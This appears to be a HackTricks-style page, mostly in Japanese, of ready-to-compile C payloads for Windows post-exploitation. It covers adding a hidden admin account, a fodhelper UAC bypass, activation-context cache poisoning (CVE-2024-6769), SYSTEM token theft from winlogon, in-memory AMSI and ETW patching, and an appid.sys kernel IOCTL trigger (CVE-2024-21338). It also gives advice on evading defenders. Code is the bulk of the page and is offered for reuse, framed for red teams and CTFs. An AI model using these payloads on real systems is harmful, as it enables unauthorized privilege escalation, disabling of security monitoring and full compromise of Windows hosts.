# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

このページでは、Windows Local Privilege Escalation や post-exploitation で役立つ、**小さく自己完結した C スニペット**をまとめています。各 payload は**コピー＆ペーストしやすい**ように設計されており、Windows API / C runtime のみを必要とします。また、`i686-w64-mingw32-gcc`（x86）または `x86_64-w64-mingw32-gcc`（x64）でコンパイルできます。

> ⚠️ これらの payload は、プロセスがアクションの実行に必要な最低限の権限（例：`SeDebugPrivilege`、`SeImpersonatePrivilege`、または UAC bypass に必要な medium-integrity context）をすでに持っていることを前提としています。これらは、脆弱性の exploit によって任意の native code execution を獲得した **red-team または CTF の環境**を想定しています。

---

## ローカル administrator user を追加する
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack（Medium → High integrity）
信頼されたバイナリ **`fodhelper.exe`** が実行されると、以下のレジストリパスに対して **`DelegateExecute` verb のフィルタリングを行わずに** クエリを実行します。このキーの下にコマンドを配置することで、攻撃者はディスクにファイルをドロップせずに UAC をバイパスできます。<sup>[[1]](#references)</sup>

*`fodhelper.exe` によってクエリされるレジストリパス*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
昇格された `cmd.exe` を起動する最小限の PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 および Windows 11 23H2（2025年7月のパッチ適用済み）でテスト済み。この bypass は、Microsoft が `DelegateExecute` path における integrity check の欠落を修正していないため、依然として機能します。*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning は、パッチ適用済みの Windows 10/11 build に対しても依然として機能します。これは、`ctfmon.exe` が high-integrity の trusted UI process として実行され、呼び出し元の impersonated `C:` drive から問題なくロードし、`CSRSS` が cache した DLL redirection をそのまま再利用するためです。攻撃の流れは次のとおりです。`C:` を attacker-controlled storage に再ポイントし、trojanized `msctf.dll` を配置し、`ctfmon.exe` を起動して high integrity を取得します。続いて、auto-elevated binary（例：`fodhelper.exe`）が使用する DLL を redirect する manifest を `CSRSS` に cache させ、次回の起動時に UAC prompt なしで payload を継承させます。<sup>[[5]](#references)</sup>

Practical workflow:
1. 偽の `%SystemRoot%\System32` tree を準備し、hijack する予定の legitimate binary（多くの場合は `ctfmon.exe`）をコピーします。
2. `DefineDosDevice(DDD_RAW_TARGET_PATH)` を使用して process 内の `C:` を remap し、変更が local に留まるよう `DDD_NO_BROADCAST_SYSTEM` を指定します。
3. DLL と manifest を偽の tree に配置し、`CreateActCtx/ActivateActCtx` を呼び出して manifest を activation-context cache に push します。次に auto-elevated binary を起動すると、redirect された DLL が shellcode に直接 resolve されます。
4. 攻撃者の痕跡を消去するため、終了時に cache entry（`sxstrace ClearCache`）を削除するか、reboot します。

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Cleanup tip: SYSTEM を取得した後、テスト時には `sxstrace Trace -logfile %TEMP%\sxstrace.etl` を実行し、続けて `sxstrace Parse` を呼び出します。ログに manifest name が表示される場合、防御側にも確認できるため、実行するたびにパスを変更してください。

---

## token duplication による SYSTEM shell の起動（`SeDebugPrivilege` + `SeImpersonatePrivilege`）
現在のプロセスが **`SeDebug`** と **`SeImpersonate`** の両方の権限を保持している場合（多くの service account では一般的）、`winlogon.exe` から token を盗み、それを複製して elevated process を起動できます:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Most modern AV/EDR engines rely on **AMSI** and **ETW** to inspect malicious behaviours.  Patching both interfaces early inside the current process prevents script-based payloads (e.g. PowerShell, JScript) from being scanned.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上記のpatchはprocess-localです。実行後に新しいPowerShellを起動すると、AMSI/ETWによる検査なしで実行されます。*

---

## 子プロセスをProtected Process Light (PPL)として作成する
`STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`を使用して、作成時に子プロセスのPPL protection levelを要求します。これはdocumented APIであり、対象イメージが要求されたsigner class（Windows/WindowsLight/Antimalware/LSA/WinTcb）用に署名されている場合にのみ成功します。<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
最も一般的に使用される Level:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Process Explorer/Process HackerでProtection columnを確認し、結果を検証します。

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys`はデバイスオブジェクト（`\\.\\AppID`）を公開しており、smart-hash maintenance IOCTLは、呼び出し元が`LOCAL SERVICE`として実行されている場合、ユーザーが提供したfunction pointerを受け入れます。Lazarusはこれを悪用してPPLを無効化し、任意のdriverをロードしているため、red teamはlabで使用できるready-made triggerを用意しておくべきです。<sup>[[6]](#references)</sup>

運用上の注意:
- `LOCAL SERVICE` tokenが必要です。`SeImpersonatePrivilege`を使用して`Schedule`または`WdiServiceHost`からtokenをstealし、ACL checksを通過できるよう、deviceに触れる前にimpersonateします。
- IOCTL `0x22A018`は、2つのcallback pointer（query length + read function）を含むstructを想定しています。両方をuser-mode stubに指定してtoken overwriteまたはring-0 primitiveのmapを作成します。ただし、KernelPatchGuardがchainの途中でcrashしないよう、bufferはRWXのままにします。
- 成功したらimpersonationを解除してdevice handleをrevertします。defenderは現在、予期しない`Device\\AppID` handleを探しているため、privilegeを取得したら直ちにcloseします。

<details>
<summary>C - `appid.sys` smart-hash abuse用のSkeleton trigger</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

weaponized build の最小限の修正: `VirtualAlloc` で RWX セクションを map し、token duplication stub をそこへコピーして、`KernelThunk = section` に設定します。その後 `DeviceIoControl` が戻ると、PPL 下でも SYSTEM になっているはずです。

---

## References

- [1] [最初のエントリ: Welcome と fileless UAC bypass（fodhelper.exe / ms-settings DelegateExecute）](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – 最小限の PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function（Win32 apps） - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [新たな Exploit Chain が Windows UAC Bypass を可能に](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus と FudModule Rootkit: Admin-to-Kernel Zero-Day による BYOVD の先へ](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
